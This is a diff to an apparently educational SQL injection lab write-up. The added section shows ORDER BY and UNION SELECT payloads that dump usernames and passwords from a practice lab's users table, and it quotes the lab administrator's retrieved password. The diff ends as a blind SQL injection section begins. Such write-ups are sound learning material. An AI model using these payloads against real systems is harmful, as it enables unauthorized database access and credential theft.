@@ -540,7 +540,7 @@ The "Internal Server Error" displayed is to tell us that there isn't a third col
 
 So, we have 2 columns available in this database
 
-Now, lets go ahead and dump the content of the columns ```username``` and ```password``` in the table ```users```. We can use this query
+Now, lets go ahead to dump the content of the columns ```username``` and ```password``` in the table ```users```. We can use this query
 ```
 ' UNION SELECT username,password FROM users--
 ```
@@ -566,7 +566,78 @@ Cool, we have successfully completed the task for this lab
 
 ## Task
 
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/68681c2b-03cb-47e4-a526-058afecdae0b)
 
+Navigate to the website and click on "Lifestyle"
+
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/e2b5b9fd-20bc-4964-b804-41e7c23c3d01)
+
+Capturing the request on burpsuite and sending it over to burp repeater,
+
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/fdce4358-ea13-417d-bc4a-c2208ff03ed0)
+
+Lets go ahead and check the number of columns available in the database, we can use the queries
+```
+' order by 1--
+' order by 2--
+' order by 3--
+```
+Using these queries
+
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/1ab904ef-0e97-4a99-95a1-20f57decf51d)
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/dae2d6ec-e44a-4dc1-97c9-5f1b3fcd3d12)
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/af5e229b-cb77-44fa-b08d-a3a7d374aa9b)
+
+From the above screenshot, it is obvious that we have just 2 columns available in the database.
+
+Lets go ahead and look for the vulnerable column, that is, the column that is compatible with string data. To do that we can use the query
+```
+' UNION SELECT 'abeg',null--
+' UNION SELECT null,'abeg'--
+```
+url encode the query before using it
+
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/07eecb17-1072-46b7-be4a-0340a36ebd98)
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/7878dd78-9ba9-4835-93be-21fe94096f33)
+
+It is evident that the second column is actually compatible with string data.
+
+Now, lets go ahead to dump the content of the columns ```username``` and ```password``` in the table ```users```. We can use this query
+
+```
+' UNION SELECT null,username || '~' || password FROM users--
+```
+Applying the query
+
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/dcc65a68-30c2-454e-ba9d-b3d21b573f99)
+
+Cool, we got the creds for the administrator user.
+
+username:```administrator```            password:```6tp172ew9j1sy5f7vx3d```
+
+Lets try to log in with this creds we found
+
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/2355ff27-ebbd-41ac-aaee-afb814bc8296)
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/690e1d70-a897-471b-a9ea-ac3434922bb2)
+
+Cool, we have successfully solved this lab.
+
+------------------------------
+
+#  Blind SQL injection with conditional responses
+<hr>
+
+## Task
+
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/cebd199e-fcb5-44c9-a0f9-97a8940ad3e4)
+
+Navigate to the webpage and click on "Gifts"
+
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/15c78331-5e68-4ce9-8a2e-2951430732d0)
+
+Capturing the request and sending it over to burp repeater,
+
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/f77d4c55-9823-446f-9dd5-2afad3995683)
 
 
 
